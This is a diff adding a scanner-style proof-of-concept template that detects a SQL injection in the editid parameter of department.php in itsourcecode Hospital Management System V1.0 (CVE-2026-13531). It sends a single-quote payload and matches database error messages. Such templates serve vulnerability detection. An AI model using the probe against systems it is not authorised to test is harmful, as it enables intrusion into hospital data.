@@ -1,0 +1,22 @@
+[info]
+id = "POC-AVE-2026-0014"
+name = "itsourcecode Hospital Management System SQL注入PoC"
+author = "AVE"
+severity = "medium"
+tags = ["sql-injection", "cve-2026-13531"]
+description = "itsourcecode Hospital Management System V1.0 的 department.php 文件中 editid 参数存在SQL注入漏洞，未经充分过滤的用户输入可被拼接至SQL查询导致数据泄露。该PoC通过注入单引号触发数据库错误，验证漏洞存在。"
+vuln_id = ["CVE-2026-13531", "AVE-2026-0014"]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/department.php"
+query.editid = "1'"
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["SQL", "mysql", "syntax", "You have an error"]
+expect = true
